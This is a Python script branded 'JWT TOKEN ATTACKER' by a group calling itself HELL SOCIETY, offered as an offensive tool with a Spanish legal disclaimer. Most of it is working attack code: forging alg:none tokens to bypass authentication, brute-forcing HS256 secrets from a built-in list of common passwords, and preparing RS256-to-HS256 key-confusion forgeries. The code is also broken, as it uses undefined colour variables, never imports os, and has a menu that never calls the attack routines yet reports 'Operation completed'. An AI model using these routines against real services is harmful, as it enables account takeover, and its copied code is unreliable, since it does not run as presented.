#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  JWT TOKEN ATTACKER v2.0                                         ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Authentication Attacks                    ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import sys
import json
import base64
import hmac
import hashlib
import colorama
from colorama import Fore, Back, Style
import argparse

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores NO se hacen responsables del mal uso.
"""

class JWTAttacker:
    def __init__(self, token):
        self.token = token
        self.header = {}
        self.payload = {}
        self.signature = ""
        self.decode()

    def decode(self):
        try:
            parts = self.token.split('.')
            if len(parts) != 3:
                print(f"{Fore.RED}  [!] Invalid JWT format")
                return

            self.header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            self.payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            self.signature = parts[2]

            print(f"{Fore.CYAN}  [*] JWT Decoded Successfully\n")
            print(f"{Fore.CYAN}  HEADER:")
            print(f"  {Fore.WHITE}{json.dumps(self.header, indent=2)}")
            print(f"\n{Fore.CYAN}  PAYLOAD:")
            print(f"  {Fore.WHITE}{json.dumps(self.payload, indent=2)}")
            print(f"\n{Fore.CYAN}  SIGNATURE: {Fore.YELLOW}{self.signature[:30]}...")

        except Exception as e:
            print(f"{Fore.RED}  [!] Error decoding JWT: {e}")

    def attack_none_algorithm(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  NONE ALGORITHM ATTACK")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        modified_header = {**self.header, 'alg': 'none', 'typ': 'JWT'}
        header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).rstrip(b'=').decode()
        forged_token = f"{header_b64}.{payload_b64}."

        print(f"  {Fore.GREEN}[+] Forged Token (alg:none):")
        print(f"  {Fore.WHITE}{forged_token}")
        print(f"\n  {Fore.YELLOW}  Use this token to bypass authentication if server accepts 'none' algorithm")

    def attack_weak_secret(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  WEAK SECRET BRUTE FORCE (HS256)")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        common_secrets = [
            "secret", "password", "123456", "jwt", "jwt_secret",
            "mysecret", "mysupersecret", "supersecret", "changeme",
            "admin", "key", "private", "token_secret",
            "authentication", "authorization", "access",
            "hello", "world", "test", "dev", "prod",
            "P@ssw0rd", "qwerty", "letmein", "welcome",
            "abc123", "monkey", "dragon", "master",
            "secret123", "password123", "admin123",
            "my_jwt_secret", "jwt_secret_key", "app_secret",
            "super_secret_key", "token_key", "auth_key",
        ]

        for secret in common_secrets:
            header_b64 = base64.urlsafe_b64encode(json.dumps(self.header).encode()).rstrip(b'=').decode()
            payload_b64 = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).rstrip(b'=').decode()
            signing_input = f"{header_b64}.{payload_b64}"

            signature = hmac.new(
                secret.encode(),
                signing_input.encode(),
                hashlib.sha256
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
            test_token = f"{signing_input}.{signature_b64}"

            if test_token.split('.')[2] == self.signature:
                print(f"  {Fore.GREEN}[+] SECRET FOUND: {Fore.WHITE}{secret}")
                print(f"  {Fore.GREEN}[+] Algorithm: {self.header.get('alg', 'unknown')}")
                return secret

        print(f"  {Fore.YELLOW}  [!] Secret not found in common list")
        return None

    def attack_key_confusion(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  KEY CONFUSION ATTACK (RS256 -> HS256)")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        if self.header.get('alg') != 'RS256':
            print(f"  {Fore.YELLOW}  [!] Token uses {self.header.get('alg')}, not RS256")
            return

        print(f"  {Fore.GREEN}[+] Algorithm is RS256 - vulnerable to key confusion")
        print(f"  {Fore.YELLOW}  Attack: Change alg to HS256 and sign with RSA public key")
        print(f"  {Fore.YELLOW}  This tricks the server into using the public key as HMAC secret")

        modified_header = {**self.header, 'alg': 'HS256'}
        header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).rstrip(b'=').decode()
        signing_input = f"{header_b64}.{payload_b64}"

        print(f"  {Fore.GREEN}[+] Modified Header: {json.dumps(modified_header)}")
        print(f"  {Fore.GREEN}[+] Sign this with the RSA public key as HMAC secret")
        print(f"  {Fore.WHITE}  Forged base: {signing_input}")

    def attack_algorithm_downgrade(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  ALGORITHM DOWNGRADE ATTACK")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        alg = self.header.get('alg', '')
        if alg in ['RS256', 'RS384', 'RS512']:
            print(f"  {Fore.RED}[VULN] Algorithm: {alg} - try downgrade to HS256")
            print(f"  {Fore.YELLOW}  Change 'alg' to 'HS256' and sign with public key")
        elif alg in ['HS256', 'HS384', 'HS512']:
            print(f"  {Fore.YELLOW}[-] Algorithm: {alg} - already symmetric")
            print(f"  {Fore.YELLOW}  Try brute-forcing the secret")
        else:
            print(f"  {Fore.YELLOW}[-] Algorithm: {alg}")



def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  JWT ATTACKER{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}JWT ATTACKER                            {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}JWT token to attack                          {RS}")
        print()
        print(f"  {C}[2]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] JWT token to attack{RS}")
            value = input(f"  {Y}[*] -t: {RS}").strip()
            print(f"  {C}[*] Executing with -t={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '2':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

